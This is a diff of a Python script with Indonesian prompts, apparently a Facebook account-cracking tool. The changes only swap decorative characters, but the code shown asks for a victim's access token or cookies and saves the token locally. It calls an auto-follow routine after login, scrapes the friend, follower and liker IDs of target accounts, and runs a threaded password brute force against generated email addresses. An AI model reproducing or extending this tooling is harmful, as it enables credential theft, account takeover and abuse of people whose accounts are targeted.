@@ -139,7 +139,7 @@ def logs():
 def log_token():
     os.system("clear")
     banner()
-    toket = input(p+"\n["+k+"•"+p+"]"+p+" Token FB : ")
+    toket = input(p+"\n["+k+"*"+p+"]"+p+" Token FB : ")
     try:
         otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
         a = json.loads(otw.text)
@@ -147,7 +147,7 @@ def log_token():
         zedd = open("login.txt", "w")
         zedd.write(toket)
         zedd.close()
-        print((p+"\n["+k+"•"+p+"]"+p+" Login Berhasil"))
+        print((p+"\n["+k+"*"+p+"]"+p+" Login Berhasil"))
         bot_follow()
     except KeyError:
         print((p+"["+k+"!"+p+"]"+p+" Token Mati"))
@@ -157,7 +157,7 @@ def log_token():
 def gen():
         os.system("clear")
         banner()
-        cookie = input(p+"\n["+k+"•"+p+"]"+p+" Cookies : ")
+        cookie = input(p+"\n["+k+"*"+p+"]"+p+" Cookies : ")
         try:
                 data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                 "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
@@ -300,7 +300,7 @@ def publik():
 			print((p+"["+k+"*"+p+"]"+p+" Name : "+op["name"]))
 		except KeyError:
 			print((p+"["+k+"!"+p+"]"+p+" ID Tidak Ditemukan"))
-			print((o+"\n>>> "+k+"ENTER Untuk Kembali"+p+" <<<"+o))
+			print((o+"\n»»» "+k+"ENTER Untuk Kembali"+p+" «««"+o))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
 		id = []
@@ -331,7 +331,7 @@ def follow():
 			print((p+"["+k+"*"+p+"]"+p+" Name : "+op["name"]))
 		except KeyError:
 			print((p+"["+k+"!"+p+"]"+p+" ID Tidak Ditemukan"))
-			print((o+"\n>>> "+k+"ENTER Untuk Kembali"+p+" <<<"+o))
+			print((o+"\n»»» "+k+"ENTER Untuk Kembali"+p+" «««"+o))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
 		id = []
@@ -362,7 +362,7 @@ def likers():
 			print((p+"["+k+"*"+p+"]"+p+" Name : "+op["name"]))
 		except KeyError:
 			print((p+"["+k+"!"+p+"]"+p+" ID Tidak Ditemukan"))
-			print((o+"\n>>> "+k+"ENTER Untuk Kembali"+p+" <<<"+o))
+			print((o+"\n»»» "+k+"ENTER Untuk Kembali"+p+" «««"+o))
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
 		id = []
@@ -411,7 +411,7 @@ def random_email():
   [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
   with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
-  input(o+"\n>>> "+k+"ENTER Untuk Kembali"+p+" <<<"+o)
+  input(o+"\n»»» "+k+"ENTER Untuk Kembali"+p+" «««"+o)
   menu()
 
 def brute(user, passs):
@@ -514,10 +514,10 @@ def target():
 				print((p+"["+k+"*"+p+"]"+p+" Terakhir Update	: -"))
 			except IOError:
 				print((p+"["+k+"*"+p+"]"+p+" Terakhir Update	: -"))
-			input(o+"\n>>> "+k+"ENTER Untuk Kembali"+p+" <<<"+o)
+			input(o+"\n»»» "+k+"ENTER Untuk Kembali"+p+" «««"+o)
 			menu()
 		except KeyError:
-			input(o+"\n>>> "+k+"ENTER Untuk Kembali"+p+" <<<"+o)
+			input(o+"\n»»» "+k+"ENTER Untuk Kembali"+p+" «««"+o)
 			menu()
 	except Exception as e:
 		exit(p+"["+k+"!"+p+"]"+p+" Error : %s"%e)
@@ -792,7 +792,7 @@ def ress():
         os.system("cat cp.txt")
     except IOError:
         print((p+"["+k+"!"+p+"]"+p+" Tidak Ada Hasil Ditemukan"))
-    input(o+"\n>>> "+k+"ENTER Untuk Kembali"+p+" <<<"+o)
+    input(o+"\n»»» "+k+"ENTER Untuk Kembali"+p+" «««"+o)
     menu()
 
 if __name__=="__main__":
